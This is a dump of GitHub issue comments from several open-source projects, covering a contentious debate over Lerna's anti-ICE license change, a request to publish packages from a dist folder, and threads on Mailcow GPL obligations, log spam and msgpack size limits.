lerna/lerna/1639/417745077,1639,"@friend I laid out the factual arguments both pro and against the question of whether Lerna should be MIT or not. I also clearly prefaced my personal opinions as being my opinions. If you're only interested in making ad-hominen arguments, you're not adding to the discussion. To be clear, my intention was not to dictate, but to spell out reasons why some forms of commentary are not fruitful in the context of what an RFC is typically designed for. You are more than welcome to make new arguments, if you have them, as long as they are on topic. To that end, I'm going to repeat what I believe is the most important argument to this discussion if you agree with the tenet that a non-MIT license will have any impact whatsoever on ICE, it follows that doing so may have a negative impact due to its indiscriminate and non-surgical nature. In other words, disrupting ICE operations can delay families from being reunited. I don't believe even the most hardcore proponent of the non-MIT license can say in good conscience and good faith that unintended damage to the very cause it purports to serve is not a real possibility, and I think that reason alone should be enough for everyone to support the current decision. ",,False
lerna/lerna/1639/417773118,1639,@friend  ,,False
lerna/lerna/1639/417756795,1639,"You laid out opinions. You can't just declare a comment a ""factual argument"" and have it be so. Opinion. Opinion. Opinion Opinion. Opinion. Opinion. Opinion. ",,False
lerna/lerna/1639/417788117,1639,I'm confident benwiley4000 and krainboltgreene are just trolling at this point. Don't give them the effort of a response. ,,False
lerna/lerna/1639/417787981,1639,@friend You really wanna stick it to Microsoft? Delete your GitHub account. Better yet -- move the repository off of GitHub! They're soon going to be its owner. ,,False
lerna/lerna/1639/417818782,1639,"I want to start by saying that I agree that the license changes, as were initially implemented, were objectively poor and probably unenforceable from a legal perspective, and that it is probably justified to revert at least until a suitable replacement could be drafted and reviewed. What concerns me are a few things, however. First, the sentence from @friend in #1633 The very fact that there was a huge amount of drama and publicity around this change signifies that it is important and that it did affect appreciable progress. There was never any delusion, as far as I could tell, by those who supported this change, that this single license change would have ICE quake in their boots, as has been suggested to be the measure of what ""affecting change"" would be by many. However, it could have served as a stepping stone and a beacon which other projects could use, and eventually create change not only in relation to ICE directly but to the notion of ethics in open source coding and licenses. @friend I haven't seen anyone use this as an argument in this entire thread actually, so I'm not sure where you're getting that this discussion is ""primarily"" about that. @friend I think this is fairly silly--as has been alluded in other posts in this thread, Open Source licenses are exactly what you are arguing against -- political protests against contemporary political issues. These were seen as ridiculous not long ago in history, and are only recently gaining widespread approval. Just because they are now the status quo for many large pieces of software doesn't mean they are particularly old, and the fact is that they were very political pieces of activism, especially in the time when they were first being penned. @friend I believe this is exactly why we want an RFC -- to discuss whether this change (or one like it) should be implemented or not. And I believe this is also what @friend meant by ""discussion is needed,"" not just ""discussion for the sake of discussion"". I don't believe that this intention is at all trollish, though the way you present it makes it sound slightly so. The idea is that we can use software and the control over we have over the software we write, one of which is the license of who gets to use it, in order to affect change in the world. You may say that this is political, but I would argue that by taking no action, you are in fact taking an action and affecting change. We must battle with which one is more positive or has a better ethical standing. I believe that this is a perfectly legitimate thing to do. However, as I said in the beginning, in the case of a license it does need to be more premediated and thought out because of the nature of legality and enforcement. This assumes that any movement against ICE is inherently bad because it assumes that the short term negative impact would out weigh any long term benefit of having ICE gone. It also ignores the potential ways in which there would be benefits throughout the entire software development and sharing community, as I mentioned near the top of my post. I believe that this argument is somewhat of a non-starter, as it asserts that ""open source"" is fundamentally better than ""not open source."" It also asserts that those definitions of ""open source"" are the correct ones and are not open for discussion. I think this is somewhat silly however, as what is and is not open source has been malleable and changed before, and I don't think it is out of the question for it to change again. ",,False
lerna/lerna/1639/417819481,1639,"The ""you're either with us entirely or you're against us"" is disgusting. There's also this. I got a similar message from the same Ryan White guy. Stop this behavior. Grow up. Wanting a better solution doesn't mean we're in favor of what ICE is doing. This change was slacktivism at its finest. Wanna really stick it to MS, get off of GitHub. Delete your accounts now, Microsoft is going to be the owner of GitHub. It was symbolic at best, and even that was kind of laughable. If you don't delete your GitHub and are still trying to argue that this change being reverted is somehow endorsing what ICE is doing, guess what -- so does having a GitHub account if you're trying to use that argument, your credibility was just shattered. ",,False
lerna/lerna/1639/417819908,1639,"The ""you're either with us entirely or you're against us"" is disgusting. There's also this. I got a similar message from the same Ryan White guy. Stop this behavior. Grow up. Wanting a better solution doesn't mean we're in favor of what ICE is doing. This change was slacktivism at its finest. Wanna really stick it to MS, get off of GitHub. Delete your accounts now, Microsoft is going to be the owner of GitHub. It was symbolic at best, and even that was kind of laughable. If you don't delete your GitHub and are still trying to argue that this change being reverted is somehow endorsing what ICE is doing, guess what -- so does having a GitHub account if you're trying to use that argument, your credibility was just shattered. ",,False
lerna/lerna/1639/417820268,1639,Also -- if you use Windows -- might I suggest not using it anymore? ,,False
lerna/lerna/1639/417823487,1639,"Oh boy... @friend The mentions of reverting to the original MIT license has been met with this statement enough times in enough issues, twitter, and reddit. It's not word for word what is said but it is heavily implied by ""you support what ICE does"". No, it's a terrible idea. Any restriction on the license means it's no longer open source. If that's the goal then I think a lot of people will just drop Lerna because of licensing risk. If that's what you want just to make a statement then that's a very poor software decision. It was entirely a trollish act, it's undebatable. 👈 Multiple links The ethical standing is to honor an open license. If lerna doesn't want to be an open source project anymore that's a different story. You cannot restrict anyone. The discussion that everyone seems to be missing is that this change converts Lerna to a proprietary piece of software. Also you're nearing the ethical dilemma of the trolley problem, not exactly, but by saying ""inaction is an action in itself"" is a  poor argument. ICE isn't going anywhere and it probably won't in the next 10 years. Whether that is a positive or negative to whoever reads this is an unfortunate thing we have to deal with. I'm 99.9% sure lerna is nothing special at a government scale, and if ICE (or company in a binding contract with ICE) needed something like lerna they'd build it themselves or simply fork the old version. This license change effectively does nothing to the target. So the discussion is resulting in debating who can virtue signal the strongest. This is a fundamental misunderstanding of what ""open"" means if one cannot see the issue with a non-open license. You will have to fight the literally brick wall of Stallman to change what ""open"" source means if you want to challenge this. Non open licenses greatly increase risk of using the software (depending on the license, the bastardization of the MIT-ICE is a huge risk). If you want to build a company you simply don't pick licenses which can destroy your business in a day. In what realm of reality does a strictly always open door, close? Open is open, closed is closed. Open source is non discriminatory, if you want to go down the path of ""restrictive licensing is open source"" then I don't see the issue with Facebook being able to restrict the people using React under their Patent license. Absolutely zero issues with a single entity controlling who uses the software while claiming to be open source. ",,False
lerna/lerna/1639/417824544,1639,"Folks who use terms like ""virtue signaling"" might not realize that is incredibly politically charged. Also it's simply not true that restrictive clauses have no precedent in open source work. Everyone screaming that ""this is no longer open source"" needs to realize that A) we are not beholden to the OSI's definition of open source, and B) there is plenty of precedent with Commons Clause, Fair Source, License Zero, and even the original license for JSON (thanks to Mikeal Rogers [formerly of the Node.js Foundation] for pointing that out on Twitter). (source) (source) ",,False
lerna/lerna/1639/417825380,1639,"So we neither have a compelling reason for Jamie K. to have been kicked nor a compelling reason why the license was reverted. I am shocked. So to recap  All maintainers accepted the original pull request. There's absolutely prior art on doing this sort of license change. Jamie K.'s behavior was apparently considered bad, but not until big companies were involved. No one in charge of this has listed any behavior that violated in the current implemented code of conduct. We're still waiting on an official response to this issue, which was created because of (what is now) a clear attempt at silencing. Multiple employees from a company on the list swooped down to convince a maintainer to revert the change (but not before specifically moving to revert their company's inclusion in the list, awkward).  And the result?  An immense amount of character assassination The gamergate, anti-coc, and hard right crowd have been riled up A fork that will surely not see life longer than a week but will have eaten plenty of valuable engineering time A new surge of engineers who think ethics aren't their problem ESR is talking again  ",,False
lerna/lerna/1639/417825724,1639,The comments he made on other projects is a violation of the CoC and that's why he was removed. I think that may have been the nth time someone has mentioned that to you. So either you're illiterate or have an agenda. ,,False
lerna/lerna/1639/417825914,1639,@friend have you heard the phraee- will somebody please think of the children? That's it. Benevolent @friend is just thinking of the children [traffickers]. ,,False
lerna/lerna/1639/417826130,1639,@friend did we just say the exact same thing? @friend the image you posted is making me wonder if you have yet acted on @friend's mirror suggestion yet. ,,False
lerna/lerna/1639/417826337,1639,"I'll just point out a particular sentence from the original licence change  on ""helped"" I think there's quite a bit of needless character assassination going on. Perhaps James has made some unfortunate statements at different times, but in the context of this issue, it hardly looks like he has claimed personal ownership of Lerna or any other open source project. ",,False
lerna/lerna/1639/417826501,1639,"@friend He did. Here is one where he directly states Lerna is his project.  is one where he claims babel is his project  one  does it keep happening D?  is no character assassination going on, he acted shitty and is being called out on it. ",,False
lerna/lerna/1639/417827208,1639,"@friend -- no I said for people who are against the change being reverted to look at the fact that they are using MS products -- which makes them hypocrites. If you want to boycott Microsoft, maybe don't use their products -- or even better get off of GitHub. I'm not even sure what you said -- to be honest I stopped reading it after the first sentence. ",,False
lerna/lerna/1639/417827484,1639,@friend -- So for all this grandstanding you're doing -- why not delete your GitHub account...seriously -- MS will own GitHub soon. Also -- change your OS from Windows -- if you use that... ,,False
lerna/lerna/1639/417827510,1639,"@friend you and @friend agree, they were being sarcastic...... ",,False
lerna/lerna/1639/417827497,1639,"I agree that this is the intent, but in practice, that's not the impression I got from reading this thread so far. The majority of comments are either trolling or doing passive-aggressive witch hunts (and sadly I'm seeing this behaviour from both sides of the discussion, mind you). I'm not sure if there needs to be more clarity in terms of an RFC is typically supposed to look like (given that it is, admittedly, a new process in this specific org), which is why I offered my opinions on what is appropriate. If people disagree, they could potentially look at other orgs' RFC processes to get an idea of how one is structured (React and Ember both have RFC processes that could serve as reference, for example). In any case, I think we would all agree that all commenters should be following the basic rule of thumb of ""if a comment would be inappropriate in a technical discussion, it has no place in an RFC discussion either"". I understand this intent, but I have not seen anyone address the concerns about what happens with  non-blacklisted companies being unable to use such licensed software. This concern was dismissed as if it were a problem that did not exist, rather than a significant one (especially for something that is so geared towards big company workflows such as Lerna). For example, @friend (or whoever is the maintainer at any time)'s employer could disallow him from using a hypothetically non-OSI-compliant Lerna at work. If that was the only reason he was working on Lerna, there's a good chance the project would lose its steward and effectively die. Likewise, I might contribute a PR to a MIT-licensed Lerna if I need the fix for work, but I will certainly not do so if I'm not allowed to use it due to licensing issues in the first place. No, the point is that we can't possibly estimate the impact, both positive and negative. We cannot make assumptions that the positives will outweigh the negatives or vice versa. The argument for a non-OSS license boils down to ""something must be done, this is something, therefore it must be done"". No, it must not. Whatever was the latest heated Javascript-related topic of the week on Hacker News is statistically unlikely to be even remotely close to being an appropriate response to an issue that likely no one here has any real life understanding of, other than what they read on some news site while sipping their coffees. It's especially disingenuous to say this must be done, if the person saying so did not even bother to try to research what other things could have been done instead, or what is being done, even. To illustrate the level of myopia here, there was a PR on Jamie's repo to add Uber to the blacklist, despite the fact that Uber is donating rides and meals to families separated by ICE*. As I mentioned in an earlier comment, there's already a well established way of running non-OSS software pay for it. This very discussion is open because the maintainers feel that inclusion of all parties is of utmost importance to the success of this project. They could just tell everyone to go away, or even pull a uws** and they'd be entirely within their rights to do so. Using the privilege of having this forum to argue that the maintainers should adopt a restrictive license is biting the hand that feeds. I think the non-starter here is to suggest that maintainers ought to maintain a project that they themselves may not be able to use under some circumstances. ",,False
lerna/lerna/1639/417827923,1639,"@friend as I said perhaps he made some unfortunate statements - what I'm trying to say is that if you look at the license change PR where he elaborated, it does not look like he thinks he personally owns the project at the exclusion of anybody else. He did not push the change without review. When people say ""my"" thing, it can mean a lot of different things - its usually not helpful to draw strong conclusions from the use of that word. Looking at the commit history, it does look like he was heavily involved in the early days of Lerna. I assume he means ""my"" in a similar sense - ""Lerna is a project which I was heavily involved in and I share significant responsibility for creating"". ",,False
lerna/lerna/1639/417828353,1639,Oh Jesus nevermind -- I'm an idiot I guess joy -- apologies @friend ) ,,False
lerna/lerna/1639/417829427,1639,"@friend I would agree if this were the actual RFC thread, but this is actually just a thread requesting an RFC should exist in the first place. Therefore I don't think it's valid to judge peoples' comments here as what they would have said in an actual RFC. And yet the reason we have OSS licenses as a staple of modern software development today was the continued preaching of outcast mailing list users in the last few decades, and you could extend this to basically any successful political protest as well. There's also lots of not OSS software that is free as in beer. And I appreciate that this is true, but being ""non-OSS"" would not preclude this from happening by default anyway. @friend And yet Stallman's own license is one of the most restrictive and closed-door OSS licenses there is. He just closes the door on a different group of people the group of people that want to use or modify his code without sharing back their changes. There's not a fundamental difference between that and precluding groups for another reason. This is also why I think the OSI page on ""evil"", originated from the JSON license, is fairly crap. I think the ""do no evil line"" is also terrible because it's even less enforceable than what the MIT-ICE license was, but the discussion in OSS around being able to preclude wrongdoers from using code has been very backwards IMO. As I said, Lerna's own license change is not meant to harm ICE by itself in any significant way, it's meant to  Deal with the ethical concerns of allowing a harmful entity to use your code Show other OSS projects that this is a real dilemma and hopefully spark them to discuss and maybe take the same action  If many OSS projects do the same thing, then there could be real, large-scale change over time. None of those show a trollish intent behind the action at all, and in the actual PR that was made, the changes were discussed in a very professional manner, all (at the time available) protocols were followed, and a calm and deliberate reasoning was given. Being terse and (arguably) rude to companies over their using tools he contributed to does not constitute the action being trollish. ",,False
lerna/lerna/1639/417830616,1639,"@friend Sure, I'm sure you could argue Adolf was a pretty cool guy if you ignore all the other stuff he did and just focus on his gun control policy. 🔥 If you just excuse it as ""unfortunate"" then you're just trying to justify your own opinions. @friend The difference between having a strict license vs claiming it's open. As I said numerous times, if the goal is to have lerna be proprietary that's a different discussion. At the current time, and as far as I know, lerna plans to stay as an open source project. Then none of them are open source anymore. You have collectively made a proprietary license. We're not arguing that so it's a moot point to even mention. He made multiple issues in the same project that all state the same thing, linking to the same resources which are there to incite hatred from a group of people towards a company. See this definition My god, it's exactly what he did. ",,False
lerna/lerna/1639/417832851,1639,And we're done. I'm going to spend the rest of the long weekend restoring my mental health. I'll resume my pariah duties on Tuesday. ,,False
lerna/lerna/901/313844623,901,"Hi, I have a same problem in a project developed with a lot of Angular 4 libraries. If dist folder cant' be symlinked directly, the services don't be injected correctly. I dislike this way proposed by angular (define a package in dist). But if customization of package dir can't be defined, Lerna can't be used with an angular project. ",,False
lerna/lerna/901/346394412,901,I recently tried using Lerna for the first time and immediately ran into this issue. Any heavy Typescript development is going to get hamstrung by the omission of this NPM feature. ,,False
lerna/lerna/901/239090644,901," Many libraries in the Angular ecosystem publish to NPM from a subdirectory that was cooked during the build process. The process is usually as followed - build the library in a subdirectory (i.e  directory) - copy package.json, license and readme to the  directory - do some package.json cleanups in the  directory (delete devDepedencies, move dependencies to peerDependencies, remove scripts...) - npm publish from the  directory.  I understand that it is not a common technique for node.js package developers but i think it is common for web package developers and my libraries uses the same technique..  While embedding  into our shared packages monorepo - [kaltura-ng]( I read a lot of issues in lerna and googled about this topic. I read carefully the conversation of issue #91 and even used the same subject with my issue. Unless I missed new issues that address this feature it was marked as 'wontfix' with a recommendation to use the 'package.jsonfiles' array instead.  The reasons for using this approach instead of  array are - Many known libraries in the Angular ecosystem does it ([angular/angular]( [ReactiveX/rxjs]( [cyclejs/cyclejs]( so they must have a reason. - There is a lot of hoo-ha/complexity with the way node.js resolve modules  for the **web projects** since during the bundling process you **must** refer to the same instance of the library. Unless the bundler (typescript, webpack etc...) provide a hack/workaround/solution to force the library to use its' own node_modules, it will not work. Publishing from sub-directory works just because the  not exists. - During development if the symlink is done against the root, when you import nested class which was not exported in the main index, you will need to refer to the  as part of the path . but once you publish from  folder directly, you should somehow fix the pass by removing the  during the tranpiling which is not a valid option. - The libraries being used as dependencies during development should be assigned as peerDependencies at runtime because you want the application to provide them.  so to recap, we cannot just publish the package with a  folder, we need to publish from  directly  There are some caveats that I could think about with my suggested approach 1. The dist folder must exists with a package.json inplace before the  process symlink the folders.  2. The build process should not delete the 'dist' folder, instead it should just clear its content otherwise the symlink of dependent libraries will be broken.  IMO those two caveats are manageable as 1. we can use a preinstall script to create the folder and a simple package.json file (with at least 'id','name'). 2. the build scripts should clear the folder content instead of  the folder itself.  ## Expected Behavior   when bootstrapping/publishing a package the package.json is being queried for the following config    if this config exists, it will symlink to that folder during bootstrap command and will publish from that folder during  publish command  using the 'config' attribute allow using the same configuration both in  and in other [node scripts]( already modified the 'bootstrap' command in a fork [esakal/lerna]( I didn't create a PR yet because I'm missing the 'publish' command. I will be happy to continue my work if you are going to consider this feature.  You can see it in action in our repo -  [kaltura-ng](   **NOTE** - your yarn version should be 0.24.6 and above  ## Current Behavior   n/a   ## Your Environment     Executable Version      2.0.0-rc.5    v0.24.6      OS Version     macOS El Capitan 10.11.6    ",,False
lerna/lerna/901/349032422,901,"Same issue here I ran into this problem, would love to get this feature, I am even ready to do a PR. @friend any thoughts? ",,False
lerna/lerna/901/349035196,901,"Have the same problem here, I’d love to have this feature, and I am willing to do a PR. @friend what are your thoughts? ",,False
lerna/lerna/901/350399903,901,"As far as I know this is the only way to accomplish ""flat"" package structure (without the  or  section in the import path) unless skipping / directories entirely, which isn't practicable if your source requires transpilation. Let's say I want to import only the  module from the  namespace inside my , what I would like it to look like is If the source is ts/jsx/esnext etc, the recommended way of distributing the package is to transpile it to a  directory (""npmDistDirectory"" in @friend's proposal), include  and publish. This doesn't seem to be possible with lerna at this moment, which is a pity. Instead I will need to transpile it to , reference it from the  prop in  and then accept the following import After spending precious time on your API design, naming convention etc, this is a bitter tradeoff. ",,False
lerna/lerna/901/350403877,901,"I don’t understand why this “flat” package structure is better than just another npm package. “big-obese-monolith” packages are an anti-pattern in npm. If you want to expose submodules directly, extract them into a separate package. Literally the reason Lerna was created in the first place. ",,False
lerna/lerna/901/350410630,901,"@friend I will not go into argument whether x is better than y - most often I am wrong. But if we ignore my poor choice of lorem-ipsum name (we can call it something else, such as ""tiny-lodash""), I can't really see why lerna should hinder the author from using a nested structure within a package and at the same time provide ""semantic imports"". I came here to evaluate lerna as a tool for managing JavaScript projects with multiple packages, not as a tool to limit me on how to structure the internals of my packages (whether good or bad). ",,False
lerna/lerna/901/350423290,901,"In my experience, as well as observation of community packages over many years, coupling consumption of a given export to the literal directory structure of a tarball is an extremely hostile anti-pattern. Especially nowadays with ES module exports and whatnot combined with tree-shaking module bundlers, there’s really no fundamental necessity for false-basedir publishing. Lerna is designed around the way npm works. Packages are published from the same directory as the package.json, and construct their tarball from metadata contained therein. Publishing from a different directory with a modified dependency tree is not idiomatic npm, and lerna will not support it. ",,False
lerna/lerna/901/350432846,901,"This will be a major limitation for TypeScript and Angular developers, and in fact some people using lerna with typescript had to do their own publish, or patch the existing implementation.  I myself want to publish from a subdirectory which does contain a  for several reasons; 1) I don't want to transpile my TS in the  folder because I'll end up having a messy file system. , , ,  all next to each other, and than to  after build will be a total mess. 2) I want to following Google's Angular Package format  Seperation of concerns, why should I have my  files within the same folder of the ? My folder structure ♠bash -- my-lib ---- package.json ---- src ------ index.ts ----dist ------ package.json ------ index.d.ts ------ index.metadata.json ------ esm2015 -------- index.js ------ esm5 -------- index.js ------ bundles -------- index.js So in reality i can publish from a subfolder as I do have a ",,False
lerna/lerna/901/354401772,901,"Author of several typescript modules here who has hit the exact same issue, all my modules publish from a  folder. Wish I'd known this before starting to use lerna! Would love this feature to be implemented, but will probably have to switch to something else instead now. ",,False
lerna/lerna/901/354461926,901,"I fail to see what typescript has to do with this non-idiomatic subdirectory pattern. You can publish npm modules with transpiled code and typings under  just fine, no mangling of package.json required. ",,False
lerna/lerna/901/354465000,901,"That won’t  work if you’d need secondary entry points like @friend/my-lib/testing On Fri, 29 Dec 2017 at 1645, Daniel Stockman notifications@friend.com wrote ",,False
lerna/lerna/901/356725527,901,"For those that are still trying to get ""flat-pack"" imports working  I was able to solve it by leveraging the , , and  scripts that were added in  me I got it working by - Disabling NPM publishing during the lerna publish command  Performing my linting and build during the  NPM script (or before) which would be built into a  folder Copy necessary files into the  folder during the  NPM script and then call . This is handled in a gulp file but I've simplified below. The  version has been bumped prior to the  script being called is only called if you do not include the  command to lerna publish     I still think a config option for  could be beneficial since it would allow a consumer to leverage the  lifecycle-hook which seems a little more intuitive. ",,False
lerna/lerna/901/358278048,901,that's why angular repos not using lerna ,,False
mailcow-dockerized/mailcow/2465/424307758,2465,"In my cow I have made many changes and added new options, not knowing how to best update them with a new code on GitHub, without break other users who will have this issue how will fix it. Thank. ",,False
mailcow-dockerized/mailcow/2465/475702799,2465,"You just stated that you don't know that's not a question; it's a statement. If your question is how to actually do this it would help to know how much experience with git-based development you have, so we can better assess on where to start explaining. If you've got enough experience andryyy's comment should help you out. ",,False
mailcow-dockerized/mailcow/2465/475703907,2465,i don't think you underztond ,,False
mailcow-dockerized/mailcow/2465/475704606,2465,"Ok, @friend can help you out; he's the maintainer 😸. ",,False
mailcow-dockerized/mailcow/2465/475705956,2465,"Actually, if you made changes to the code itself there should be an open repo (or otherwise publicly available current version of the code) of this per the license of this project. Where can we inspect this code? I see no open repositories under your GitHub account. ",,False
mailcow-dockerized/mailcow/2465/475707290,2465,"I think he asking how to update Mailcow if you have done lots of changes to the code, I might wrong don't want to sound rude but there seem to be a bit of language barrier. ",,False
mailcow-dockerized/mailcow/2465/475707966,2465,"@friend Oooh, ok. Well, as long as only configuration stuff is involved, there should be no issue updating, I think. (You should always backup anyway.) If functionality was added, he is bound by the license to make his code publicly available, though. I can't speak for @friend but in his stead I wouldn't want to support anyone who is violating the license. ",,False
mailcow-dockerized/mailcow/2465/475708815,2465,Did ./update.sh it stoped working ,,False
mailcow-dockerized/mailcow/2465/475709553,2465,"This is the point in time where you save the logs of the update,restore your backup and show us what the logs say. Though I don't know if anyone might want to help you as long as you're violating the license. ",,False
mailcow-dockerized/mailcow/2465/475712258,2465,"I don't think this should break anything, but we still can't help without some diagnostic output... Follow the issue template and if you think your rspamd scores make more sense you should create a PR. ",,False
mailcow-dockerized/mailcow/2465/475718019,2465,@friend I don't think adding new functionality to Mailcow would count as a license violation even if they don't release the code as long as they are not distributing it.   ,,False
mailcow-dockerized/mailcow/2465/475718528,2465,"Please stop claiming that @friend violates the license. He's most likely not doing that. Simple stuff like the Dockerfiles and configurations is too trivial to be copyrightable, so the license mainly applies to  the scripts, web UI, etc. Besides that, the GPLv3 only requires you to provide the code if you redistribute the software (e.g. if someone started selling Mailcow for other people to run on their own servers), not if you are only running it (either for your own use or as a hosting company that provides managed Mailcow instances). This is different from the AGPLv3, which, for example, requires you to provide the code as soon as you are allowing someone to use the software over the network. These kinds of comments indeed do not help. Please provide a full explanation of your problem and all relevant logs. When you created a new issue, the template actually asked you to do precisely that. ",,False
mailcow-dockerized/mailcow/2465/475724692,2465,Huh. ) Okay. Thought he wants to contribute code. ,,False
mailcow-dockerized/mailcow/2465/475731012,2465,"@friend @friend As stated in  is no mention that you don't need to make the code available after a modification of the code if you're only using it for yourself. Actually it suggests otherwise. That's why I didn't ever dig further into this. On the other hand we have this  means ""conveying"" here, as per the GPL  actually you're wrong. We have JavaScript as part of this repo. And now see this  we use Ajax calls the javascript part of the code is explicitly considered NOT to be trivial as per the link provided. Since you're making part of the GPL code available directly to the public just by visiting the mailcow site, you WILL have to disclose any changes to the code IMHO. Correct me with a reliable source please, if I missed something. I'm now even more confused about @friend's comment here  though 😖. ",,False
mailcow-dockerized/mailcow/2465/475741133,2465,I don't think andryyy care if someone modify or add stuff to Mailcow unless they are posting screenshot or asking for help to fix issue caused by their modification. Even if andryyy did wanted ever bit of code from a user that  modified their Mailcow install it not like he's going to even know about it unless the person messages him saying I've modified your code you want a copy. ,,False
mailcow-dockerized/mailcow/2465/475741859,2465,That's why I mentioned  where he actually asked for it. ,,False
mailcow-dockerized/mailcow/2465/475744204,2465,I have close why still messageing ,,False
mailcow-dockerized/mailcow/2465/475747898,2465,"Did anyone teach you manners if allof (header contains ""X-GitHub-Sender"" ""Hickstead"") { discard; } that shoud keep my inbox clear of you. ",,False
mailcow-dockerized/mailcow/2465/475749505,2465,"I'm willing to believe there was a big language-barrier problem (maybe auto translate) and all the talk of violating licenses may have scared Hickstead, so his comment about still messaging may not have been meant the way it came across. 👍 ",,False
mailcow-dockerized/mailcow/2465/475752502,2465,"Sorry, didn't want to scare anyone or get offtopicky. ( I'd be happy if anyone could cite something that disproves what I found out, though, just for clarity, because that's how I always interpreted Mailcow to behave in context of GPL. plus one ",,False
mailcow-dockerized/mailcow/2465/475765797,2465,"Your interpretation is probably a bit strict, @friend. Commonly one only insists on publishing the source code if someone provides (usually by selling) the software to someone else to run on their own computer. So all internal use is not affected. It's unclear to me whether the redistribution of the JS code also requires the publication of modifications to the server-side code. My guess is no (as the license also applies to each file individually, one can redistribute them individually), but that question can basically only be answered by a lawyer. I already locked this discussion, but since you are team members, you can continue commenting here. I just ask that we stick to the actual technical questions instead of discussing nitpicky licensing details that none of us is an expert on. ",,False
mailcow-dockerized/mailcow/2465/475766572,2465,Agreed. Thanks for clarifying. plus one ,,False
miktex/MiKTeX/163/341800572,163,"Please note we will close your issue without comment if you delete, do not read or do not fill out the issue checklist below and provide all the required information. Checklist  [ ] I am reporting a bug others will be able to reproduce [ ] I have installed the latest MiKTeX updates [ ] I have checked the MiKTeX log files  Please replace this section with the required information  step-by-step reproduction instructions input files which are necessary to reproduce the bug your observations (command output, screenshots, ...) relevant log file snippets  ",,False
miktex/MiKTeX/163/405512405,163,"@friend  Why is it invalid? I need a solution to this problem. There is no way to edit this path, it is set by MiKTeX... ",,False
miktex/MiKTeX/163/405513242,163,This is an invalid report  You haven't checked the log files You didn't provide the required information  ,,False
minecolonies/ldtteam/2094/292059384,2094,"Minecolonies version First detection  forge-1.12.2-14.23.1.2665-universal + minecolonies-universal-1.12.2-0.8.6905 ( and other version ) Lastest test  forge-1.12.2-14.23.1.2604-universal + minecolonies-universal-1.12.2-0.8.7200 Expected behavior No log, reduct log to minimum, place a option in config file for stop log, place this log in separated file.  run /mc colonies rsResetAll in Version 1.12.2-0.8.7193 ( read in description ) Same problem. Massive LOG file. 2531 entry in one second in file fml-junk-earlystartup.log [120716] [Server thread/DEBUG] [minecolonies] Attempting to find a Factory with Primary com.minecolonies.api.colony.requestsystem.factory.FactoryVoidInput -&gt; com.minecolonies.api.colony.requestsystem.data.IRequestSystemBuildingDataStore [120716] [Server thread/DEBUG] [minecolonies] Found matching Factory for Primary input type. Log file  Reducted file from a server start to stop. fml-junk-earlystartup.log ",,False
mojo/kraih/1238/340595516,1238," Mojolicious version 7.85 Perl version 5.28.0 Operating system macos  Steps to reproduce the behavior Just just the delay helper. Expected behavior A deprecation warning with explaination what to do, alternative options. How can i replace the helper code with what ? Actual behavior Warnings that delay helper is DEPRECATED. Problem warning without alternative options. User just panics that the code will stop to work one day. ",,False
mojo/kraih/1238/404479635,1238,Please use our official support channels. ,,False
mojo/kraih/1238/404490887,1238,"This discussion is meant to either change/introduce documentation or code. You can mark it as a suggestion, but closing it is not very helpful. For instance, NetOAuth2AuthorizationServer tests upon installation produce many of these warnings, just as an example. It affects other CPAN authors along the way, and web searches should end up here, i suppose. ",,False
mojo/kraih/1238/404493264,1238,"You did not propose any specific changes that could be discussed here. Until you reach that stage, please use our official support channels for discussions. ",,False
mojo/mojolicious/1236/340189202,1236, Mojolicious version 7.87 Perl version v5.26.1 Operating system ubuntu  Steps to reproduce the behavior perl -MMojoFile -le 'MojoFile-&gt;new(q(a.txt))-&gt;spurt(qq(\x{100}))' Expected behavior a.txt written with 2 bytes c4 80 Actual behavior get error Wide character in syswrite at /home/dk/perl5/perlbrew/perls/perl-5.26.1/lib/5.26.1/x86_64-linux/IO/Handle.pm line 483. a.txt is zero bytes ,,False
mojo/mojolicious/1238/340595516,1238," Mojolicious version 7.85 Perl version 5.28.0 Operating system macos  Steps to reproduce the behavior Just just the delay helper. Expected behavior A deprecation warning with explaination what to do, alternative options. How can i replace the helper code with what ? Actual behavior Warnings that delay helper is DEPRECATED. Problem warning without alternative options. User just panics that the code will stop to work one day. ",,False
msgpack-python/msgpack/338/390906569,338,"Hello, I upgraded from 0.5.x to 0.6.x and somewhere in the middle the option max_array_len has been reduced from 2^32 -1 to 128*1024. My application now breaks because the generated lists are too big. Is there any way to set the option from within my application? Something like msgpack.max_array_len = xxx ? Thanks ",,False
msgpack-python/msgpack/338/447161401,338,Why don't you search before asking here? It is written in docstring and document. ,,False
msgpack-python/msgpack/338/447163761,338,See also ,,False
msgpack-python/msgpack/338/447193685,338,"Apologies, I did search the code, that's how I was able to pinpoint the issue. I was more looking for a global limit/configuration type of parameter, that I could set externally, like an environment variable. ",,False
msgpack-python/msgpack/338/458019767,338,"Do continue on this issue, how do you disable the limits? The documentation states So, is it  or is it ? Additionally, the function signature for  has it specified to defaulting to , which isn't either of the previous values. Does -1 mean 128*1024, or does it mean INT_MAX - 1 (like I'd expect it to). In general, default arguments should be the default value, or none (for cases of mutable values, like list), in which case it is explicitly documented that passing none/-1/whatnot is internally translated to \&lt;default value&gt;.. Basically, the verbiage in the documentation isn't clear how all the options interact, and what values mean what. Additionally, it doesn't really make sense to me to have / etc.... do anything if  is set to 0 (INT_MAX), and having to specify a pile of options just to turn off safety checking for contexts where I'm shipping LARGE chunks of data back and forth between endpoints I control is annoying. I have a context where I pretty regularly have 100+ MByte messages.  Really, if you're going to have checking in place, add another class like  that does this stuff. ",,False
msgpack-python/msgpack/338/458025916,338,"There are no way.  msgpack has it's upper bound (2**64).  So  is enough. Do you mean ""is it  or is it ? If  &gt;0, it's . If  == 0 (or other falthy values), it's . This usage of  is very common Python idiom. -1 is default value, and semantics for default value is described already. You don't have to ""specify a pile of options"".  (BTW, I don't think 5 is not ""a pile of"".  You can count it by one hand.) You can just use  (10GB) in such case.  If 10GB is not enough, you can use 100GB (if your machine have 100GB RAM). If I added it, people keep using  for untrusted source.  Security hole is keep living. Anyway, it's too late.  Making weaker than released version is not possible option. ",,False
msgpack-python/msgpack/338/458026781,338,"My point was that no, it's not. And you still haven't specified if -1 means  or . Reading the docs page , I can interpret it either way. I mean, if you're writing code, yeah, but it doesn't help in the docs. And the general default value for ""use defaults"" is . Using -1 seems like you're writing C code, not python. If I needed to not specify anything previously, and the functionality is pointless, yes, it is a pile of options. So 0 means , except for , where it means . It'd be nice if 0 meant the same thing when passed to , ,  and . Having them all act differently is a great recipe for confusion. I don't agree this is a problem in the first place.  You might as well just make  return None in all cases, for any input, otherwise someone will figure out how to break something. ",,False
